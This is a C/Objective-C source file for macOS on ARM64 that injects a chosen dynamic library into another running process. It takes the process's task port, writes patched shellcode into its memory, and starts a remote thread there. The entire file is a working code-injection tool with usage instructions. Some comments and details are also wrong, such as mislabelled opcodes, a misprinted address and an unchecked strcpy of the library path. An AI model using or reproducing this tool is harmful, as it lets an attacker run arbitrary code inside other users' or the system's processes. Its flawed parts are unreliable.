#import <Foundation/Foundation.h>
#include <dlfcn.h>

extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);

#define STACK_SIZE 65536
#define CODE_SIZE 200 // the size of the shellcode

char code[] = 
"\xff\x83\x00\xd1"      // sup sp, sp, #2
"\xfd\x7b\x01\xa9"      // stp x29, x30, [sp, #16]
"\xfd\x43\x00\x91"      // add x29, sp, #16
"\xe0\x03\x00\x91"      // mov x0, sp
"\xe1\x03\x1f\xaa"      // mov x1, xzr
"\xa2\x00\x00\x10"      // adr x2, _dopen
"\xe3\x03\x1f\xaa"      // mov x3, xzr
"\x44\x01\x00\x58"      // ldr x4, pthrcrt  => LOAD ADDRESS FROM PTHRCRT
"\x80\x00\x3f\xd6"      // ldr x4           => BRANCH TO pthread_create_from_mach_thread
// _jmp:
"\x00\x00\x00\x14"      // b _jmp

// _dopen:
"\xa0\x01\x00\x10"      // adr x0, dylib    => LOAD ADDRESS OF DYLIB INTO x0
"\x21\x00\x80\xd2"      // mov x1, #1       => RTLD_LAZY
"\xe7\x00\x00\x58"      // ldr x7, dlopen   => LOAD ADDRESS FROM dlopen
"\xe0\x00\x3f\xd6"      // ldr x6           => BRANCH TO dlopen
"\xe8\x00\x00\x58"      // ldr x8, pthrext  => LOAD ADDRESS OF pthread_exit
"\x00\x00\x80\xd2"      // movz x0, 0
"\x00\x01\x3f\xd6"      // blr x8           => BRANCH TO pthread_exit

"PTHRDCRT"              // placeholder for pthread_create_from_mach_thread address
"DLOPEN__"              // placeholder for dlopen address
"PTHREXIT"              // placeholder for pthread_exit address
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB" // placeholder for dylib path to load
"\x00\x00\x00\x00";

int main(int argc, char **argv)
{
    if (argc != 3) {
        fprintf(stderr, "usage:   ./binary PID /path/to/dylib\n");
        fprintf(stderr, "example: ./binary 1234 /tmp/xyz.dylib\n");
        exit(1);
    }

	pid_t pid;
	pid = atoi(argv[1]);

    char * lib = argv[2];

	task_t remoteTask;
	kern_return_t kr;

	kr = task_for_pid(mach_task_self(), pid, &remoteTask);
	if (kr != KERN_SUCCESS) {
		fprintf(stderr, "failed to get task port for pid=%d, error=%s\n",
			pid, mach_error_string(kr));
        exit(1);
	}

    printf("* got task=%d for pid=%d\n", remoteTask, pid);

    mach_vm_address_t remoteStack = (vm_address_t)NULL;
    mach_vm_address_t remoteCode = (vm_address_t)NULL;

    kr = mach_vm_allocate(remoteTask, &remoteStack, STACK_SIZE, VM_FLAGS_ANYWHERE);

    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "failed to allocate stack memory=%s\n", mach_error_string(kr));
        exit(1);
    } else {
        printf("* allocated stack at 0x%llx\n", remoteStack);
    }

    kr = mach_vm_allocate(remoteTask, &remoteCode, CODE_SIZE, VM_FLAGS_ANYWHERE);

    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "failed to allocate stack memory=%s\n", mach_error_string(kr));
        exit(1);
    } else {
        printf("* allocated code at 0x%llx\n", remoteCode);
    }

    uint64_t addr_of_dlopen = (uint64_t)dlopen;
    uint64_t addr_of_pthread = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
    uint64_t addr_of_sleep = (uint64_t)dlsym(RTLD_DEFAULT, "sleep");
    uint64_t addr_of_exit = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_exit");

    char * possible_patch_location = (code);
    for (int i = 0; i < 0x100; i++) {
        possible_patch_location++;

        if (memcmp(possible_patch_location, "PTHRDCRT", 8) == 0) {
            memcpy(possible_patch_location, &addr_of_pthread, sizeof(uint64_t));
            printf("* found pthread_create_from_mach_thread at 0x%llx\n", addr_of_pthread);
        }

        if (memcmp(possible_patch_location, "PTHREXIT", 8) == 0) {
            memcpy(possible_patch_location, &addr_of_exit, sizeof(uint64_t));
            printf("* found pthread_exit at 0x%llx\n", addr_of_pthread);
        }

        if (memcmp(possible_patch_location, "DLOPEN__", 6) == 0) {
            memcpy(possible_patch_location, &addr_of_dlopen, sizeof(uint64_t));
            printf("* found dlopen at 0x%llx\n", addr_of_dlopen);
        }

        if (memcmp(possible_patch_location, "LIBLIBLIB", 9) == 0) {
            strcpy(possible_patch_location, lib);
        }
    }

    printf("* finished patching\n");

    kr = mach_vm_write(remoteTask, remoteCode, (vm_address_t)code, CODE_SIZE);

    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "failed to write code at 0x%llx; error=%s\n", remoteCode, mach_error_string(kr));
        exit(1);
    } else {
        printf("* written code at 0x%llx\n", remoteCode);
    }

    printf("* spawning thread\n");
    kr  = vm_protect(remoteTask, remoteCode, CODE_SIZE, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    remoteStack += (STACK_SIZE / 2);

    task_flavor_t flavor = ARM_THREAD_STATE64;
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;

    arm_thread_state64_t state;

    state.__pc = (uintptr_t)remoteCode;
    state.__sp = (uintptr_t)remoteStack;

    thread_act_t thread;
    kr = thread_create_running(remoteTask, flavor, (thread_state_t)&state, count, &thread);

    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "error spawning thread; error=%s\n", mach_error_string(kr));
        exit(1);
    } else {
        printf("* finished injecting into pid=%d with dylib=%s\n", pid, lib);
    }
}
